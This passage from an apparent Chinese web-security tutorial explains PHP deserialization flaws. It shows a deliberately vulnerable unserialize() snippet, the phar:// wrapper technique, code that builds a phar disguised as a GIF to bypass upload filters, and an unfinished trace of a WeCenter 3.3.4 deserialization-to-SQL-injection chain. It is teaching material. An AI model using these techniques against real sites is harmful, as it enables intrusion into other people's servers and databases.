class="code-snippet_outer"><span class="code-snippet__keyword">if</span>(<span class="code-snippet__keyword">isset</span>($_POST[<span class="code-snippet__string">'o'</span>])){</span></code><code><span class="code-snippet_outer">$s = $_POST[<span class="code-snippet__string">'o'</span>];</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span>(!@$unser = unserialize($s)){</span></code><code><span class="code-snippet_outer">$html.=<span class="code-snippet__string">"&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;"</span>;</span></code><code><span class="code-snippet_outer">}<span class="code-snippet__keyword">else</span>{</span></code><code><span class="code-snippet_outer">$html.=<span class="code-snippet__string">"&lt;p&gt;{$unser-&gt;test}&lt;/p&gt;"</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>漏洞成因:</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>一.参数可控</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">从源码可以看到反序列化的变量是post请求的,post请求变量名为o,通过抓包发现我们输入框输入的值,正好赋值给Post变量o</span></p><p><img data-ratio="0.3763440860215054" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/5_NZ7wl2kdmHasteLr4IB3LmROPGNmhg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaB0wfkloacdduIOEqXtHoL1vUNZ7wl2kdmHasteLr4IB3LmROPGNmhg/640?wx_fmt=png'" data-type="png" data-w="744"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>二.实现了unserialize()函数</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">这一点是肯定的,没有这个函数这里肯定就无法反序列化</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>三.调用了魔法函数</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">__construct函数可利用</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>四.没有过滤</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">没有对传参进行过滤，否则无法构成目的Payload。</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><p><span style="font-size:15px;line-height:35px;;">实战中要更具情况来构造payload,能利用的漏洞也远不止xss</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>phar://伪协议</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">除了unserialize反序列化之外 ，另一种能够反序列化方式是利用 phar://&nbsp;协议触发反序列化,前提是完全可控的文件名。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">这个方法是在BlackHat 大会上的 Sam Thomas 分享了&nbsp;</span><span style="font-size:15px;line-height:35px;;">File Operation Induced Unserialization via the “phar://” Stream Wrapper</span><span style="font-size:15px;line-height:35px;;">&nbsp;，该研究员指出<strong>该方法在文件系统函数 （ file_get_contents 、 unlink 等）参数可控的情况下，配合 phar://伪协议 ，可以不依赖反序列化函数 unserialize() 直接进行反序列化的操作</strong>。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>什么是phar</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">官方文档:</span></p><p><span style="font-size:15px;line-height:35px;;color: rgb(255, 104, 39);">https://www.php.net/manual/zh/book.phar.php</span></p><p><span style="font-size:15px;line-height:35px;;">简单来说，phar是PHP提供的一种压缩和归档的方案，并且还提供了各种处理它的方法。</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>phar结构</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">由四部分组成:</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>一:stub</strong></span></p><p><span style="font-size:15px;line-height:35px;;">即用来标识phar 文件的部分，类似MZ头。格式为</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer">Phar::mapPhar();</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">include</span> <span class="code-snippet__string">'phar://phar.phar/index.php'</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"><span class="code-snippet__keyword">__HALT_COMPILER</span>();</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">?&gt;</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"><strong>二:manifest describing the contents</strong></span></p><p><span style="font-size:15px;line-height:35px;;">phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分，也存储用户自定义的meta-data，这是用来攻击的入口，最核心的地方</span></p><p><img data-ratio="0.4714828897338403" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/6_1RVjwQYlpTpIGcp5ibrphrRialiaTw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaGzvhmpPZxs24H6d1Q7MSWgGXXHia1RVjwQYlpTpIGcp5ibrphrRialiaTw/640?wx_fmt=png'" data-type="png" data-w="1315"  /></p><p><span style="font-size:15px;line-height:35px;;"><strong>三:the file contents</strong></span></p><p><span style="font-size:15px;line-height:35px;;">被压缩文件的内容</span></p><p><strong><span style="font-size:15px;line-height:35px;;">四</span></strong><span style="font-size:15px;line-height:35px;;">:<strong>signature for verifying Phar integrity</strong></span></p><p><span style="font-size:15px;line-height:35px;;">可选项，即签名。</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>demo</strong></span></p><p><span style="font-size:15px;line-height:35px;;">根据phar文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。</span></p><p><span style="font-size:15px;line-height:35px;;"><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。不要只读</strong></span></p><p><span style="font-size:15px;line-height:35px;;"></span><img data-ratio="0.4569471624266145" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/7_TtVRQhDHRWYpTxu3HfOUnzFZFZ3gfQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaENkTac2iaYdn7cKzsJpknmx31TtVRQhDHRWYpTxu3HfOUnzFZFZ3gfQ/640?wx_fmt=png'" data-type="png" data-w="1022"  /></p><p><span style="font-size:15px;line-height:35px;;">如果修改了之后在phpinfo上还是On的话记得把这行最前面的分号删掉,这样就行了</span></p><p><img data-ratio="0.39253279515640765" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/8_hvhYHVUtBPnxajWaDjftanuR4RibMQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaS6ZBkWysy1DVtEZZ7kb3qeI9JhvhYHVUtBPnxajWaDjftanuR4RibMQ/640?wx_fmt=png'" data-type="png" data-w="991"  /></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">TestObject</span> </span>{</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">@unlink(<span class="code-snippet__string">"1.phar"</span>);</span></code><code><span class="code-snippet_outer">$phar = <span class="code-snippet__keyword">new</span> Phar(<span class="code-snippet__string">"1.phar"</span>); <span class="code-snippet__comment">//后缀名必须为phar</span></span></code><code><span class="code-snippet_outer">$phar-&gt;startBuffering();</span></code><code><span class="code-snippet_outer">$phar-&gt;setStub(<span class="code-snippet__string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="code-snippet__comment">//设置stub</span></span></code><code><span class="code-snippet_outer">$o = <span class="code-snippet__keyword">new</span> TestObject();</span></code><code><span class="code-snippet_outer">$phar-&gt;setMetadata($o); <span class="code-snippet__comment">//将自定义的meta-data存入manifest</span></span></code><code><span class="code-snippet_outer">$phar-&gt;addFromString(<span class="code-snippet__string">"test.txt"</span>, <span class="code-snippet__string">"test"</span>); <span class="code-snippet__comment">//添加要压缩的文件</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//签名自动计算</span></span></code><code><span class="code-snippet_outer">$phar-&gt;stopBuffering();</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">访问该php页面,会在文件当前目录下生成一个phar文件</span><br  /></p><p><img data-ratio="0.3238095238095238" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/9_fcqVIL3h1F3DMqDsgbpMC9e1y1ukHQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaRvicRI7uO02yc16ACTtmkNUvXfcqVIL3h1F3DMqDsgbpMC9e1y1ukHQ/640?wx_fmt=png'" data-type="png" data-w="840"  /><span style="font-size:15px;line-height:35px;;">很明显的序列化特征，TestObject这个类已经以序列化形式储存</span></p><p><span style="font-size:15px;line-height:35px;;"></span><img data-ratio="0.2799227799227799" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/10_VVTS6k2fw3oiaP7LWpFIRSNuZuibbQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRak2FL8osO6LnmSOaT9ZqA3H7LRqVVTS6k2fw3oiaP7LWpFIRSNuZuibbQ/640?wx_fmt=png'" data-type="png" data-w="1036"  /></p><p><span style="font-size:15px;line-height:35px;;">有序列化,必然有反序列化来处理,</span><strong style="font-size:15px;line-height:35px;;">php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化</strong><span style="font-size:15px;line-height:35px;;">，测试后受影响的函数如下：</span><br  /></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">fileatime</span>    <span class="code-snippet__string">filectime        filemtime    file_exists    file_get_contents    file_put_contents</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">file</span>         <span class="code-snippet__string">filegroup        fopen        fileinode      fileowner            fileperms</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">is_dir</span>       <span class="code-snippet__string">is_file          is_link      is_executable  is_readable          is_writeable</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">is_wirtble</span>   <span class="code-snippet__string">parse_ini_file   copy         unlink         stat                 readfile</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><span style="font-size:15px;line-height:35px;;"><strong>将phar文件伪装为gif</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">phar在设计时,只要求前缀为__HALT_COMPILER();而后缀或者内容并未设限,可以构造文件绕过上传</span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">TestObject</span> </span>{</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">@unlink(<span class="code-snippet__string">"sd.phar"</span>);</span></code><code><span class="code-snippet_outer">$phar = <span class="code-snippet__keyword">new</span> Phar(<span class="code-snippet__string">"sd.phar"</span>);</span></code><code><span class="code-snippet_outer">$phar-&gt;startBuffering();</span></code><code><span class="code-snippet_outer">$phar-&gt;setStub(<span class="code-snippet__string">"GIF89a"</span>,<span class="code-snippet__string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="code-snippet__comment">//设置stub，增加gif文件头</span></span></code><code><span class="code-snippet_outer">$o = <span class="code-snippet__keyword">new</span> TestObject();</span></code><code><span class="code-snippet_outer">$o-&gt;data=<span class="code-snippet__string">'sd!'</span>;</span></code><code><span class="code-snippet_outer">$phar-&gt;setMetadata($o); <span class="code-snippet__comment">//将自定义meta-data存入manifest</span></span></code><code><span class="code-snippet_outer">$phar-&gt;addFromString(<span class="code-snippet__string">"test.txt"</span>, <span class="code-snippet__string">"test"</span>); <span class="code-snippet__comment">//添加要压缩的文件</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//签名自动计算</span></span></code><code><span class="code-snippet_outer">$phar-&gt;stopBuffering();</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p><img data-ratio="0.4037460978147763" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/11_fV4AuKcW13ibJ8urNfhJSZ9bxWOV2A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaCovlIbkfrcqLs7HVUPibhKnlPCfV4AuKcW13ibJ8urNfhJSZ9bxWOV2A/640?wx_fmt=png'" data-type="png" data-w="961"  /></p><p><br  /></p><p><img data-ratio="0.14772727272727273" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/12_0Xpnu8ibuGBBYAWtVP0rR1qKvH4MTQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaHtjp3ffgdGYvGsb3Qb2yMlvJV0Xpnu8ibuGBBYAWtVP0rR1qKvH4MTQ/640?wx_fmt=png'" data-type="png" data-w="1056"  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="xml"><code><span class="code-snippet_outer"><span class="code-snippet__meta">&lt;?php</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">include</span>(<span class="code-snippet__string">'phar://sd.gif'</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__class"><span class="code-snippet__keyword">class</span> <span class="code-snippet__title">TestObject</span> </span>{</span></code><code><span class="code-snippet_outer">    <span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">__destruct</span><span class="code-snippet__params">()</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">echo</span> <span class="code-snippet__keyword">$this</span>-&gt;data;</span></code><code><span class="code-snippet_outer">    }</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">?&gt;</span></span></code></pre></section><p><span style="font-size:15px;line-height:35px;;"></span><br  /></p><p><img data-ratio="0.3854033290653009" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/13_QiaxSKpcduXTOknLTvhHLsCQLEZUxA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaDY26fa3qTL8S8YTYXs47hTHBqQiaxSKpcduXTOknLTvhHLsCQLEZUxA/640?wx_fmt=png'" data-type="png" data-w="781"  /></p><p><span style="font-size:15px;line-height:35px;;">成功将meta-data中data数据反序列化出来</span></p><p><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>总结</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">利用条件:</span></p><ol class="list-paddingleft-2"><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">phar文件要能够上传到服务器端。</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">要有可用的魔术方法作为“跳板”。</span></p></li><li style="font-size:15px;line-height:35px;;"><p><span style="font-size:15px;line-height:35px;;">文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</span></p></li></ol><p><span style="font-size:15px;line-height:35px;;"></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>WeCenter3.3.4反序列化造成sql注入</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong>这个洞有点老了,但不影响学习分析</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><br  /></strong></span></p><p><span style="color: rgb(255, 104, 39);font-size:15px;line-height:35px;;">cms下载地址:</span></p><p><span style="color: rgb(255, 104, 39);font-size:15px;line-height:35px;;">http://www.wecenter.com/downloads/</span></p><p><span style="color: rgb(255, 104, 39);font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;">在这个版本的cms中存在多个反序列化POP链，如果我们想利用这些 POP 链，就必须找到可控的反序列化点。WeCenter 中就存在可控的文件名,能够利用phar伪协议</span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;定位到漏洞文件<strong>./system/aws_model.inc.php</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><img data-ratio="0.42226148409893993" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/14_trmbfFcbicPPRpwqXcVicg20ohJPwg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRaE4NBDfiaMsUSsYKia1ykefnobA0jtrmbfFcbicPPRpwqXcVicg20ohJPwg/640?wx_fmt=png'" data-type="png" data-w="1132"  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">&nbsp;析构函数遍历了<strong>$this-&gt;_shutdown_query</strong>变量，然后带入了<strong>$this-&gt;query()</strong>函数，跟一下</span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">public</span> <span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">query</span><span class="code-snippet__params">($sql, $limit = null, $offset = null, $where = null)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">$this</span>-&gt;slave();</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!$sql)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">throw</span> <span class="code-snippet__keyword">new</span> <span class="code-snippet__keyword">Exception</span>(<span class="code-snippet__string">'Query was empty.'</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($where)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">$sql .= <span class="code-snippet__string">' WHERE '</span> . $where;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($limit)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">$sql .= <span class="code-snippet__string">' LIMIT '</span> . $limit;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($offset)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">$sql .= <span class="code-snippet__string">' OFFSET '</span> . $offset;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (AWS_APP::config()-&gt;get(<span class="code-snippet__string">'system'</span>)-&gt;debug)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">$start_time = microtime(<span class="code-snippet__keyword">TRUE</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">try</span> {</span></code><code><span class="code-snippet_outer">$result = <span class="code-snippet__keyword">$this</span>-&gt;db()-&gt;query($sql);</span></code><code><span class="code-snippet_outer">} <span class="code-snippet__keyword">catch</span> (<span class="code-snippet__keyword">Exception</span> $e) {</span></code><code><span class="code-snippet_outer">show_error(<span class="code-snippet__string">"Database error\n------\n\nSQL: {$sql}\n\nError Message: "</span> . $e-&gt;getMessage(), $e-&gt;getMessage());</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (AWS_APP::config()-&gt;get(<span class="code-snippet__string">'system'</span>)-&gt;debug)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">AWS_APP::debug_log(<span class="code-snippet__string">'database'</span>, (microtime(<span class="code-snippet__keyword">TRUE</span>) - $start_time), $sql);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> $result;</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p><span style="font-size:15px;line-height:35px;;">并没有任何的过滤,如果</span><strong style="font-size:15px;line-height:35px;;">$this-&gt;_shutdown_query</strong><span style="font-size:15px;line-height:35px;;">变量参数可控,那么就可以造成sql注入</span><br  /></p><p><span style="font-size:15px;line-height:35px;;">利用反序列化的方式，可以重置<strong>$this-&gt;_shutdown_query</strong>的值。</span></p><p><span style="font-size:15px;line-height:35px;;">再看<strong>./models/account.php</strong></span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">public</span> <span class="code-snippet__function"><span class="code-snippet__keyword">function</span> <span class="code-snippet__title">associate_remote_avatar</span><span class="code-snippet__params">($uid, $headimgurl)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!$headimgurl)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">false</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!$user_info = <span class="code-snippet__keyword">$this</span>-&gt;get_user_info_by_uid($uid))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">false</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> ($user_info[<span class="code-snippet__string">'avatar_file'</span>])</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">false</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!$avatar_stream = file_get_contents($headimgurl))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> <span class="code-snippet__keyword">false</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">$avatar_location = get_setting(<span class="code-snippet__string">'upload_dir'</span>) . <span class="code-snippet__string">'/avatar/'</span> . <span class="code-snippet__keyword">$this</span>-&gt;get_avatar($uid, <span class="code-snippet__string">''</span>);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">$avatar_dir = dirname($avatar_location) . <span class="code-snippet__string">'/'</span>;</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (!file_exists($avatar_dir))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">make_dir($avatar_dir);</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p><strong style="font-size:15px;line-height:35px;;">associate_remote_avatar</strong><span style="font-size:15px;line-height:35px;;">函数将传进来的</span><strong style="font-size:15px;line-height:35px;;">$headimgurl</strong><span style="font-size:15px;line-height:35px;;">没有经过任何过滤直接传入了文件操作函数</span><strong style="font-size:15px;line-height:35px;;">file_get_contents</strong><span style="font-size:15px;line-height:35px;;">中，这个系统函数正好就在受影响的范围之内。</span><span style="font-size:15px;line-height:35px;;">全局搜索</span><strong style="font-size:15px;line-height:35px;;">associate_remote_avatar</strong><span style="font-size:15px;line-height:35px;;"><br  /></span></p><p><span style="font-size:15px;line-height:35px;;"></span></p><p><span style="font-size:15px;line-height:35px;;">在<strong>./app/account/ajax.php</strong></span></p><p><span style="font-size:15px;line-height:35px;;"><strong><img data-ratio="0.2906367041198502" src="图片/HACK学习呀_2021-06-16_Web安全PHP反序列化入门这一篇就够了/15_k2bbv1a5DXKlMhnENXK7sHv4pryL3w.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9vcJ0AAlY5iaSI3yNdcJdRam5S3WKa4Z2wIWwRicF9e2Nbg1k2bbv1a5DXKlMhnENXK7sHv4pryL3w/640?wx_fmt=png'" data-type="png" data-w="1335"  /></strong></span></p><p><span style="font-size:15px;line-height:35px;;">这个函数调用了</span><strong style="font-size:15px;line-height:35px;;">associate_remote_avatar,</strong><span style="font-size:15px;line-height:35px;;">而&nbsp;</span><strong style="font-size:15px;line-height:35px;;">$headimgurl&nbsp;</strong><span style="font-size:15px;line-height:35px;;">值来源于&nbsp;</span><strong style="font-size:15px;line-height:35px;;">$wxuser['headimgurl']</strong><span style="font-size:15px;line-height:35px;;">，这个$wxuser实际上是数据库</span><strong style="font-size:15px;line-height:35px;;">users_weixin</strong><span style="font-size:15px;line-height:35px;;">&nbsp;表中的相关数据，如果有insert,update就好了</span><br  /></p><p><span style="font-size:15px;line-height:35px;;">在<strong>./models/openid/weixin/weixin.php</strong></span></p><p><img 